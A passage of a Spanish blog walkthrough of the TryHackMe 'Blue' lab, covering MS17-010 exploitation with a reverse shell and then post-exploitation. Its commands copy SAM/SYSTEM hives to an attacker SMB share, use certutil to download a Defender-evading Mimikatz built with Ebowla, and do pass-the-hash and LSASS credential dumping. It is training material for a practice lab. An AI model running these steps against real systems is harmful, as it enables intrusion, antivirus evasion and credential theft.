+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/primera_flag.png"
+                      alt="Obtención de la primera bandera."
+                ><figcaption>Obtención de la primera bandera.</figcaption></figure></p>
+<p>Segunda bandera en el directorio donde se almacenan las contraseñas:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Windows\\System32\\config</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">cat flag2.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/segunda_flag.png"
+                      alt="Obtención de la segunda flag."
+                ><figcaption>Obtención de la segunda flag.</figcaption></figure></p>
+<p>En la imagen da error porque ya estoy en dicho directorio, ejecute el comando sin querer.</p>
+<p>Tercera bandera, ‘Donde los administradores suelen guardar cosas interesantes.’.</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Users\\Jon\\Documents\\</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">cat flag3.txt</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/tercera_flag.png"
+                      alt="Resultado de la tercera flag."
+                ><figcaption>Resultado de la tercera flag.</figcaption></figure></p>
+<h2 id="Explotacion-manual"><a href="#Explotacion-manual" class="headerlink" title="Explotación manual"></a>Explotación manual</h2><h3 id="Uso-de-zzz-exploit"><a href="#Uso-de-zzz-exploit" class="headerlink" title="Uso de zzz exploit"></a>Uso de zzz exploit</h3><p>Es bueno saber como usar mestasploit ya que es considerada una herramienta muy pontente, aunque considero que no se debe de abusar de ella porque no ganariamos tanto conocimiento como realizar una <strong>explotación manual</strong>.</p>
+<p>Vamos a buscar un script en google <strong>ms17-010 zzz_exploit py</strong> de worawit.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/worawit/MS17-010</span><br></pre></td></tr></table></figure></div>
+<p>Este repositorio funciona mejor con <strong>python 2</strong>. Vamos a empezar ejecutando el script checker, ya sabéis que yo utilizo arch y debo de instalar un paquete(<strong>impacket</strong>) para poder ejecutar el script.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S python2-impacket</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 checker.py 10.10.115.185</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/preview_checker_zzz.png"
+                      alt="Preview del script checker."
+                ><figcaption>Preview del script checker.</figcaption></figure></p>
+<p>Si en alguno de las pipes te muestra información en lugar de status_access_denied significa que tenemos una forma potencial de ejecutar comandos, incluso ya soo con ver <strong>the target is not patched</strong>. Esto no significa que no deje, debemos <strong>modificar el script checker.py</strong> y indicar en el campo <strong>USERNAME</strong> el usuario <strong>guest</strong>:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/credenciales_guest_checker_zzz.png"
+                      alt="Indicamos el usuario guest en checker.py"
+                ><figcaption>Indicamos el usuario guest en checker.py</figcaption></figure></p>
+<p>Pero a continuación vemos que el usuario guest no está activado en la máquina víctima.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/error_guest_checker_zzz.png"
+                      alt="Error con el usuario guest."
+                ><figcaption>Error con el usuario guest.</figcaption></figure></p>
+<p>Puedes poner las credenciales del usuario encontrado con metasploit anteriormente y funcionaría:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/checker_despues_de_poner_credenciales.png"
+                      alt="Después de poner las credenciales."
+                ><figcaption>Después de poner las credenciales.</figcaption></figure></p>
+<h3 id="Uso-de-Autoblue"><a href="#Uso-de-Autoblue" class="headerlink" title="Uso de Autoblue"></a>Uso de Autoblue</h3><p>En la máquina de tryhackme no está activado el usuario guest(en la de hack the box sí), pero aún así podemos utilizar el script <a class="link"   href="https://github.com/3ndG4me/AutoBlue-MS17-010" >AutoBlue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Nos permite tener una mayor flexibilidad y retocar ciertas características que metasploit no permite. Este también tiene un checker y nos sale lo siguiente al ejecutarlo:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/autoblue_path_wordlists_not_found_checker.png"
+                      alt="Autoblue no encuentra los diccionarios."
+                ><figcaption>Autoblue no encuentra los diccionarios.</figcaption></figure></p>
+<p>Al intentar modificar el script para indicar la ruta veo que no se encuentra aquí, siguiendo el rastro, encuentro el problema en la función <strong>check_accesisible_pipes()</strong>, exactamente en la función de la conexión(conn.find_named_pipe), objeto creado por el módulo importado <strong>mysmb</strong>(más abajo se ve), una vez aquí dentro busco por el output que nos muestra al no encontrar el diccionario y encuentro la ruta:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/autoblue_change_path_checker.png"
+                      alt="Cambiamos la ruta en el script mysmb.py"
+                ><figcaption>Cambiamos la ruta en el script mysmb.py</figcaption></figure></p>
+<p>Ahora probamos a ejecutar el script de nuevo:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/autoblue_checker_ok.png"
+                      alt="Ejecucción exitosa del checker."
+                ><figcaption>Ejecucción exitosa del checker.</figcaption></figure></p>
+<p>Genial, parece que funciona, ahora debemos de dirigirnos al directorio shellcode y dentro encontraremos un script llamado <strong>shell_prep.sh</strong> que nos generará la carga, este nos realizará diferentes preguntas al ejecutarlo:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/autoblue_generate_shellcode.png"
+                      alt="Generando el shellcode."
+                ><figcaption>Generando el shellcode.</figcaption></figure></p>
+<ul>
+<li><p><strong>msfvenom</strong>: Herramienta para generar payloads, en este caso nuestra reverse shell.</p>
+</li>
+<li><p><strong>LHOST</strong>: Ip que recibe la shell, en este caso ponemos la del adaptador tun de la vpn.</p>
+</li>
+<li><p><strong>LPORT x64</strong>: puerto donde se envía la shell de x64 bits.</p>
+</li>
+<li><p><strong>LPORT x86</strong>: puerto donde se envía la shell de x86 bits.</p>
+</li>
+<li><p><strong>meterpreter shell o regular cmd</strong>: Visto con metasploit, con meterpreter permite hacer algunas cosas extras automátizadas, mas ejecucción en memoria…</p>
+</li>
+<li><p><strong>staged payload o stageless payload</strong>: El payload con etapas tiene la primera parte más pequeña y hace más difícil detectarlo, necesita conexión a internet para descargar el resto, mientras que el payload sin etapas va todo de golpe, puede ser más fácil de detectar. Nosotros utilizaremos este porque vamos a usar netcat para establecer la conexión y no esta preparado para múltiples fases con intercambio de información.</p>
+</li>
+</ul>
+<p>Nos ponemos por escucha con una terminal por el puerto indicado:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> rlwrap nc -nlvp 8888</span><br></pre></td></tr></table></figure></div>
+
+<p>Con rlwrap podemos realizar acciones como ctrl+L y más.</p>
+<p>Ejecutamos el <strong>eternalblue_exploit7.py</strong>:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 eternalblue_exploit7.py 10.10.244.238 shellcode/sc_x64.bin</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/whoami_en_victima.png"
+                      alt="Ejecucción del comando whoami en la máquina víctima."
+                ><figcaption>Ejecucción del comando whoami en la máquina víctima.</figcaption></figure></p>
+<p>Cómo podéis comprobar no siempre es un camino de rosas, te vas a encontrar muchas trabas, si en el exploit de python(zzz_exploit.py) visto anteriormente hubiera salido algún pipe poniendo el usuario <strong>guest</strong> tendríamos que haber modificado el script para que en lugar de escribir un archivo en C: se conectará a un recurso compartido mediante smb creado por nosotros para ejecutar un binario netcat.exe para proporcionarnos la reverse shell. Quién quiera entrar más en detalle de cómo realizar en este <a class="link"   href="https://www.youtube.com/watch?v=92XycxcAXkI" >vídeo de s4ivtar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> lo explica, minutos 57:00-1:01:19.</p>
+<h1 id="Post-explotacion"><a href="#Post-explotacion" class="headerlink" title="Post explotación"></a>Post explotación</h1><h2 id="Activar-el-usuario-Administrator"><a href="#Activar-el-usuario-Administrator" class="headerlink" title="Activar el usuario Administrator"></a>Activar el usuario Administrator</h2><p>En está máquina tenemos desactivados el usuario Administrator, podríamos hacer lo mismo con guest, pero no nos va a hacer falta:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user Administrator /active:yes</span><br><span class="line"><span class="built_in">net</span> user Administrator Administrator</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Copia-del-archivo-SAM-y-SYSTEM"><a href="#Copia-del-archivo-SAM-y-SYSTEM" class="headerlink" title="Copia del archivo SAM y SYSTEM"></a>Copia del archivo SAM y SYSTEM</h2><ul>
+<li><p><strong>SAM</strong>(Security Account Manager): Base de datos que almacena las credenciales de los usuarios del sistema.</p>
+</li>
+<li><p><strong>SYSTEM</strong>: Parte del registro que contiene información crítica para del sistema y claves de cifrado útiles para descifrar los hashes del archivo SAM.</p>
+</li>
+</ul>
+<p>Nos podemos dirigir al directorio <strong>C:\Windows\Temp</strong>, crear una carpeta y hacer una copia de estos archivos:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\system system.backup</span><br><span class="line">reg save HKLM\sam sam.backup</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/saves_reg_sam_system.png"
+                      alt="Copia de SAM y SYSTEM."
+                ><figcaption>Copia de SAM y SYSTEM.</figcaption></figure></p>
+<p>A continuación nos lo vamos a transferir por smb hacía nuestro equipo.</p>
+<h2 id="Enlaces-simbolicos-para-impacket"><a href="#Enlaces-simbolicos-para-impacket" class="headerlink" title="Enlaces simbólicos para impacket"></a>Enlaces simbólicos para impacket</h2><p>Para compartir recursos mediante SMB desde nuestro equipo Arch vamos a utilizar <strong>Impacket</strong>, pero en mi caso, al estar en arch y intentar ejecutar el binario me pone que no es encontrado y si esta instalado(pacman -S impacket), al parecer los binarios son almacenados sin indicar <strong>impacket-</strong> al principo como otros sistemas operativos(ej: Kali Linux) en la ruta &#x2F;usr&#x2F;bin&#x2F; Bien, pues he encontrado un <a class="link"   href="https://github.com/NoobGajen/impacket-Symbolic-link-for-Arch-Linux-as-Kali-Linux/blob/master/impacket-Symbolic-link-for-Arch-Linux-as-Kali-Linux.sh" >script realizado por NoobGajen<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que se encarga de crear enlaces símbolicos en dicho directorio por cada paquete de impacket instalado en la misma ruta &#x2F;usr&#x2F;bin.</p>
+<p>Script:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if impacket or python-impacket-git is installed and get the package name</span></span><br><span class="line">package=$(pacman -Qs | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -E <span class="string">&#x27;^local/impacket$|^local/python-impacket-git$&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the package variable is non-empty (i.e., a matching package is found)</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$package</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[32m<span class="subst">$(basename $package local/)</span>\033[0m package found installed in your system:)&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;Now, creating symbolic link for impacket binaries...\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the list of binaries for the package and create symbolic links</span></span><br><span class="line">    binaries=$(pacman -Ql <span class="variable">$package</span> | grep -i <span class="string">&#x27;/usr/bin/[A-Za-z0-9._-]\+&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> binary <span class="keyword">in</span> <span class="variable">$binaries</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">ln</span> -sfv <span class="string">&quot;<span class="variable">$binary</span>&quot;</span> <span class="string">&quot;/usr/bin/impacket-<span class="subst">$(basename <span class="string">&quot;<span class="variable">$binary</span>&quot;</span> .py)</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;Impacket is not installed in your Arch Linux.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Le damos permisos de ejecucción y lanzamos.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/creacion_symbolic_links_impacket.png"
+                      alt="Creación de los links simbólicos."
+                ><figcaption>Creación de los links simbólicos.</figcaption></figure></p>
+<p>Con reiniciar la terminal o cerrarla y abrir otra ya podemos utilizarlo el comando con el formato <strong>impacket-…</strong></p>
+<h2 id="Transferencia-de-archivos-mediante-smb"><a href="#Transferencia-de-archivos-mediante-smb" class="headerlink" title="Transferencia de archivos mediante smb"></a>Transferencia de archivos mediante smb</h2><p>Utilizamos la herramienta <strong>impacket-smbserver</strong> para que la víctima nos vea y nos pueda mandar los archivos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> impacket-smbserver smbFolder $(<span class="built_in">pwd</span>) -smb2support</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><p><strong>impacket-smbserver</strong>: Herramienta que nos permite crear un servidor smb.</p>
+</li>
+<li><p><strong>smbFolder</strong>: nombre del recurso compartido.</p>
+</li>
+<li><p><strong>$(pwd)</strong>: Directorio que queremos compartir</p>
+</li>
+<li><p><strong>smb2support</strong>: Compatible para los clientes que utilicen smb2.</p>
+</li>
+</ul>
+<p>Acto consecutivo en la shell de la víctima vamos a copiar estos archivos a mi equipo mediante smb:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> sam.backup \\<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span>\smbFolder\sam</span><br><span class="line"><span class="built_in">copy</span> system.backup \\<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span>\smbFolder\system</span><br></pre></td></tr></table></figure></div>
+
+<p>Y el resultado sería el siguiente:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/mandar_sam_system_victima_atacante_via_smb.png"
+                      alt="Mandar via smb los archivos sam y system."
+                ><figcaption>Mandar via smb los archivos sam y system.</figcaption></figure><br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/recibir_sam_system_atacante_impacket_smb.png"
+                      alt="Recibir los archivos sam y system."
+                ><figcaption>Recibir los archivos sam y system.</figcaption></figure></p>
+<p>Al tener estos archivos ya en nuestro equipo podemos utilizar <strong>impacket-secretdump</strong> que nos devolverá los hashes de los usuarios:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam -system system LOCAL</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/hashes_volcados_con_impacket_secretsdump.png"
+                      alt="Obtención de hashes con impacket-secretsdump."
+                ><figcaption>Obtención de hashes con impacket-secretsdump.</figcaption></figure></p>
+<p>Estos hashes los puedes intentar de romper como hemos visto antes con metasploit, mediante crackstation, hashcat…</p>
+<h2 id="Informacion-extra-y-conexion-con-el-usuario-Administrator-mediante-Pass-The-Hash"><a href="#Informacion-extra-y-conexion-con-el-usuario-Administrator-mediante-Pass-The-Hash" class="headerlink" title="Información extra y conexión con el usuario Administrator mediante Pass The Hash"></a>Información extra y conexión con el usuario Administrator mediante Pass The Hash</h2><p>Imaginaros que la contraseña de Administrator(que la hemos puesto nosotros) es muy complicada y no conseguimos sacar el hash, podemos realizar <strong>pass the hash</strong>, está técnica consiste en conectarse utilizando el hash ntlm en lugar de la contraseña, para ello vamos a utilizar netexec(cómo crackmapexec) para comprobar si esto es posible:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec 10.10.110.244 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-H</strong>: Hash(en este caso NTLM)</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/netexec_pass_the_hash.png"
+                      alt="Intento fallido de pass the hash."
+                ><figcaption>Intento fallido de pass the hash.</figcaption></figure></p>
+<p>Obtener hashes de contraseña almacenados en memoria, secretos como contraseñas de cuentas.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.91.251 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;31d6cfe0d16ae931b73c59d7e0c089c0&#x27;</span> --lsa</span><br></pre></td></tr></table></figure></div>
+
+<p>No vemos nada interesante.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/netexec_administrator_lsa_secrets.png"
+                      alt="Resultado de los secretos."
+                ><figcaption>Resultado de los secretos.</figcaption></figure></p>
+<p>Para entrar al sistema con el usuario Administrador sería:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rlwrap impacket-psexec WORKGROUP/Administrator@10.10.145.252 -hashes :d144986c6122b1b1654ba39932465528</span><br></pre></td></tr></table></figure></div>
+
+<p>Y así podríamos entrar solo teniendo el hash.</p>
+<p>El siguiente paso es utilizar <strong>Mimikatz</strong> para intentar extraer las credenciales de Administrator de la memoria en texto claro. En una auditoría real, se puede llegar a comprometer un equipo con cuentas no privilegiadas, pero con mimikatz algunas veces se pueden ver contraseñas de usuarios privilegiados en memoria.</p>
+<h2 id="Mimikatz-y-ofuscacion-con-Ebowla-para-evadir-el-defender"><a href="#Mimikatz-y-ofuscacion-con-Ebowla-para-evadir-el-defender" class="headerlink" title="Mimikatz y ofuscación con Ebowla para evadir el defender"></a>Mimikatz y ofuscación con Ebowla para evadir el defender</h2><p>En este caso nos lo descargamos del siguiente <a class="link"   href="https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe" >repositorio<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, recuerda que tiene que ser .exe para transferirlo a la máquina víctima.</p>
+<p>Pero antes de transferir nada, tenemos que asegurarnos de que el antivirus(el defender) no nos lo casque, para ello vamos a utilizar <a class="link"   href="https://github.com/Genetic-Malware/Ebowla" >Ebowla<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que nos ofusca el archivo y se desencripta con las variables de entorno de la víctima. Está un poco desactualizado y puede que con los nuevos antivirus o algunos más complejos no funcione, pero para este caso nos sirve.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Genetic-Malware/Ebowla</span><br><span class="line"></span><br><span class="line"><span class="comment"># Movemos el mimikatz dentro del directorio Ebowla</span></span><br><span class="line"><span class="built_in">mv</span> mimikatz.exe Ebowla</span><br></pre></td></tr></table></figure></div>
+
+<p>Nos dirigimos dentro del directorio Ebowla y abrimos el archivo <strong>genetic.config</strong>.</p>
+<p>Una vez dentro vamos a modificar los siguientes valores:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_genetic_config_output_payload_type_modification.png"
+                      alt="Modificación de la variable output_type y payload_type."
+                ><figcaption>Modificación de la variable output_type y payload_type.</figcaption></figure></p>
+<p>Ahora vamos un poco en el script hasta que estemos en [[ENV_VAR]] que es la chicha.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_genetic_config_env_var_vacio.png"
+                      alt="Variables de entorno por defecto."
+                ><figcaption>Variables de entorno por defecto.</figcaption></figure></p>
+<p>Hay que tener cuidado a la hora de rellenarlo, porque si nos equivocamos en alguna luego el binario no se va interpretar bien y no se podrá descrifrar correctamente.</p>
+<p>Para ir rellenándolas tendremos que ir a la consola víctima y ir viendo el valores de estas variables de entorno.</p>
+<p>Para ver las variables de entorno en windows tenemos el comando: <strong>echo %variable_entorno%</strong>, cuando no reporta nada mejor no se pone nada, es mejor que no intentéis buscarlo de otra forma porque a lo mejor no lo interpreta correctamente.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_genetic_config_env_var_completado.png"
+                      alt="Variables de entorno rellenadas."
+                ><figcaption>Variables de entorno rellenadas.</figcaption></figure></p>
+<p>Guardamos, cerramos, instalamos las siguientes dependencias para que el script funcione:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S python2-configobj python2-pyparsing</span><br></pre></td></tr></table></figure></div>
+
+<p>Ejecutamos el script:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 ebowla.py mimikatz.exe genetic.config</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_go_mimikatz.png"
+                      alt="Creación del archivo mimikatz con go que será compilado."
+                ><figcaption>Creación del archivo mimikatz con go que será compilado.</figcaption></figure></p>
+<p>Si vemos lo que hay en el directorio output que nos ha creado, veremos el archivo go_symmetric_mimikatz.exe.go. Tenemos el script <strong>build_x64_go.sh</strong> que se va a encargar de compilar nuestro archivo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./build_x64_go.sh output/go_symmetric_mimikatz.exe.go mimikatz.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Al ejecutar el script vemos que algo no ha ido bien, que novedad eh, arch y sus cosas. En este caso dice lo siguiente entre otras líneas:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cgo: C compiler &quot;x86_64-w64-mingw32-gcc&quot; not found: exec: &quot;x86_64-w64-mingw32-gcc&quot;: executable file not found in $PATH</span><br></pre></td></tr></table></figure></div>
+<p>Nada pues lo instalamos <strong>sudo pacman -S mingw-w64-gcc</strong> y volvemos a ejecutar el comando:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_script_bash_go_compila_mimikatz.png"
+                      alt="Compilación final de mimikatz."
+                ><figcaption>Compilación final de mimikatz.</figcaption></figure></p>
+<p>Bien, ya nos lo ha creado en el directorio output, vamos a transferir el archivo, en esta ocasión con un servidor en python:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m http.server 80</span><br></pre></td></tr></table></figure></div>
+
+<p>Y en la máquina víctima nos lo descargamos con certutil:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil.exe -f -urlcache -split http://<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span>/mimikatz.exe</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><strong>certutil.exe</strong>: Herramienta nativa de Windows que permite administrar certificados y claves criptográficas. En nuestro caso abusamos de él para descargar archivos de internet.</li>
+<li><strong>-f</strong>: Sobreescribe un archivo si ya existe.</li>
+<li><strong>-urlcache</strong>: Para descargar archivos.</li>
+<li><strong>split</strong>: Divide el archivo en muchas partes y luego lo reensambla. Útil para manejar archivos grandes o redes inestables.</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/mimikatz_in_victim_machine.png"
+                      alt="Mimikatz descargado en la máquina víctima."
+                ><figcaption>Mimikatz descargado en la máquina víctima.</figcaption></figure></p>
+<p>Si probamos a ejecutar el programa nos sale lo siguiente:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/preview_mimikatz_victim_machine.png"
+                      alt="Mimikatz en la máquina víctima."
+                ><figcaption>Mimikatz en la máquina víctima.</figcaption></figure></p>
+<p>Ahora en la consola interactiva de mimikatz ponemos lo siguiente:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>privilege::debug</strong>: Elevamos los privilegios del proceso que esta ejecutando Mimikatz. Intenta habilitar el privlegio SeDebugPrivilege en el proceso para poder inspeccionar y manipular la memoria de otros procesos.</li>
+<li><strong>sekurlsa::logonPasswords</strong>: Extrae la información de autenticación de la memoria, específicamente de LSASS(Local Security Authority Sybsystem Service). Nos puede mostrar contraseñas en texto claro, hashes NLTM, Tickets de Kerberos, información sobre sesiones de usuarios activas.</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/mimikatz_results_without_passwords.png"
+                      alt="Resultados de mimikatz sin contraseña."
+                ><figcaption>Resultados de mimikatz sin contraseña.</figcaption></figure></p>
+<p>En este caso no nos muestra credenciales en texto claro, pero podría ser que lo hiciera.</p>
+<h2 id="Informacion-extra"><a href="#Informacion-extra" class="headerlink" title="Información extra"></a>Información extra</h2><h3 id="LaZagne-Stealer-de-contrasenas"><a href="#LaZagne-Stealer-de-contrasenas" class="headerlink" title="LaZagne Stealer de contraseñas."></a>LaZagne Stealer de contraseñas.</h3><p>Dejo comentado por aquí que tenemos la herramienta <strong><a class="link"   href="https://github.com/AlessandroZ/LaZagne" >LaZagne<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> que nos permite recolectar credenciales almacenadas en nuestro equipo(navegador, gestores de contraseñas, tokens…).</p>
+<h2 id="Activacion-y-conexion-sobre-RDP"><a href="#Activacion-y-conexion-sobre-RDP" class="headerlink" title="Activación y conexión sobre RDP"></a>Activación y conexión sobre RDP</h2><p>Podemos comprobar si la máquina víctima tiene el servicio RDP disponible:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p3389 --open -v -n 10.10.145.252</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/port_rdp_nmap_scan.png"
+                      alt="Comprobación del puerto RDP."
+                ><figcaption>Comprobación del puerto RDP.</figcaption></figure></p>
+<p>Al estar cerrado tendríamos que utilizar <strong>netexec</strong> para activar el rdp en la máquina víctima:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.145.252 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;d144986c6122b1b1654ba39932465528&#x27;</span> -M rdp -o action=<span class="built_in">enable</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-M rdp</strong>: Indicamos el módulo RDP.</li>
+<li><strong>-o action&#x3D;enable</strong>: -o Nos permite pasarle opciones al módulo seleccionado, en este caso que active rdp en caso de que no este.</li>
+</ul>
